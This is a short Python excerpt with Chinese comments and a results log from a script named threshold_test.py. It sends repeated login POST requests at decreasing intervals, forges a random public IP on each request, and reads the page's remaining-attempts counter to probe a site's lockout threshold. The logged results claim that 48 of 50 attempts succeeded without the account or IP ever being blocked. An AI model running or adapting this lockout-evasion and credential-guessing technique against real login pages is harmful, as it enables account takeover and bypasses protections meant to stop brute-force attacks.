python threshold_test.py
# 核心实现（节选）：
PHASES = [(10.0, 10), (5.0, 10), (3.0, 30)]   # (每请求间隔秒, 本阶段条数)
for delay, cnt in PHASES:
    for _ in range(cnt):
        spoof = rand_ip()
        hit, page, setc, dt = post_login(op, cj, user, pwd, fh, spoof)
        remain = re.search(r"您還可以嘗試\s*(\d+)\s*次", page)
        # 连续 3 次异常 ⇒ 判定触顶，立即停止
        time.sleep(delay)

def rand_ip():   # 公网随机 IP，排除私网/保留段
    while True:
        ip = "%d.%d.%d.%d" % (random.randint(1,223), random.randint(0,255),
                              random.randint(0,255), random.randint(1,254))
        a,b = ip.split(".")[:2]
        if a in ("10","127","0","169","255") or (a=="172" and 16<=int(b)<=31) \
           or (a=="192" and b=="168"): continue
        return ip

# 实测结果（靶标 http://example.com，新出口 IP）：
#   10s/req x10  → 全部成功，remain=4
#    5s/req x10  → 全部成功，remain=4
#    3s/req x30  → 48/50 成功（2 条单次 TimeoutError 后自愈），全程未封
#   ⇒ 并发触发结论成立
